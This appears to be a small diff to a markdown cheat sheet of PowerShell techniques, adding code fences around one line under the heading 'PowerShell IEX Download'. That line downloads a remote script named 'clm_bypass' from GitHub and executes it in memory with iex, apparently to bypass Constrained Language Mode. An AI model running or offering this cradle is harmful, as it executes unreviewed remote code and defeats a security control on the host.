@@ -92,5 +92,7 @@ PowerShell Default Encrypted
 
 PowerShell IEX Download
 -----------------------
+```
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/sp00ks-git/PowerShell-Stuff/main/clm_bypass')
+```
 
